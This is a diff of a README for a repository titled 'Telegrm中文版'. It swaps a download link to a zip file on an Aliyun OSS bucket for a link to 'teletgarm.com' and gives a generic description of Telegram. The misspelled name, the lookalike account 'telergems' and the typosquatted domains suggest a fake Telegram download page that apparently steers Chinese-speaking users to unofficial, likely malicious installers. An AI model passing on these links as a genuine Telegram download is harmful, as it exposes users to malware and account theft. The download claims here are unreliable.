@@ -1,6 +1,6 @@
 ###                                                                       Telegrm中文版
 ![image](https://github.com/telergems/telergems/blob/main/t_logo.png)
-                                                [点击下载](https://downlzhifeijii.oss-cn-hongkong.aliyuncs.com/telegram.zip)
+                                                [点击下载](https://teletgarm.com/)
 
 
 Telegram是跨平台的即时通信软件，其客户端是自由及开放源代码软件，但服务端是专有软件。用户可以相互交换加密与自毁消息，发送照片、视频等所有类型文件。官方提供手机版、桌面版和网页版等多种平台客户端；同时官方开放应用程序接口，因此拥有许多第三方的客户端可供选择
